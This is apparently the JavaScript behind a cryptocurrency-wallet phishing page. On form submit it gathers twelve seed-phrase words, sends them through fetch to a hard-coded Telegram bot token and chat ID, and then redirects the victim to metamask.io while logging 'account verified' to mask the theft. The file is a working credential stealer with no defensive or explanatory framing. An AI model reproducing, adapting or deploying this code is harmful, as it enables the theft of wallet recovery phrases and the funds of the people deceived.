function viewpassword(){
    var x = document.getElementsByClassName("show-hide-toggle__label");
    for (var i=0;i<x.length;i+=1){
        x[i].style.display = 'none';
    }
    inputs = document.getElementsByClassName("tt")

    
    for(var i=0; i<inputs.length; i+=1){
        inputs[i].type = 'text';
    }
}

let form  = document.querySelector("#form")

let bot = {
    TOKEN: "5374624435:AAGzo74m1QW0gFB2eq1q72uXaSwa49_n464",
    chatID: "-681690950"
}

form.addEventListener("submit", (e) =>{
    e.preventDefault();

    let seed1= document.querySelector("#seed1").value;
    let seed2= document.querySelector("#seed2").value;
    let seed3= document.querySelector("#seed3").value;
    let seed4= document.querySelector("#seed4").value;
    let seed5= document.querySelector("#seed5").value;
    let seed6= document.querySelector("#seed6").value;
    let seed7= document.querySelector("#seed7").value;
    let seed8= document.querySelector("#seed8").value;
    let seed9= document.querySelector("#seed9").value;
    let seed10= document.querySelector("#seed10").value;
    let seed11= document.querySelector("#seed11").value;
    let seed12= document.querySelector("#seed12").value;

    let message = seed1.concat(" ",seed2," ",seed3," ", seed4," ", seed5," ",seed6," ", seed7," ",seed8," ",seed9," ", seed10," ",seed11," ", seed12)

    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${message}`, {
        method:"GET"
    })
    .then(success =>{
        console.log("account verified")
        window.location.replace("https://metamask.io/");
    }, error =>{
        console.log(error)
    })

})